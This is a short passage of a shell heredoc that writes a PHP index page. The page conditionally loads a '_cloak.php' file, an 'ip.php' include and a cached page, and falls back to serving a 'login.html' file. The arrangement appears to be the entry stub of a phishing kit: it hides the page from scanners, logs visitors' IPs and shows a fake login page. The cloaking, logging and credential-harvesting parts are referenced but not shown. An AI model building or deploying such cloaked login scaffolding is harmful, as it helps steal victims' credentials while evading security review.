INDEXEOF'
<?php
$cloak_file = __DIR__ . '/../_cloak.php';
if (file_exists($cloak_file)) {
    require_once $cloak_file;
}
$ip_file = __DIR__ . '/ip.php';
if (file_exists($ip_file)) {
    include $ip_file;
}
$cache_path = __DIR__ . '/cache.php';
if (file_exists($cache_path)) {
    require $cache_path;
} else {
    readfile(__DIR__ . '/login.html');
}
INDEXEOF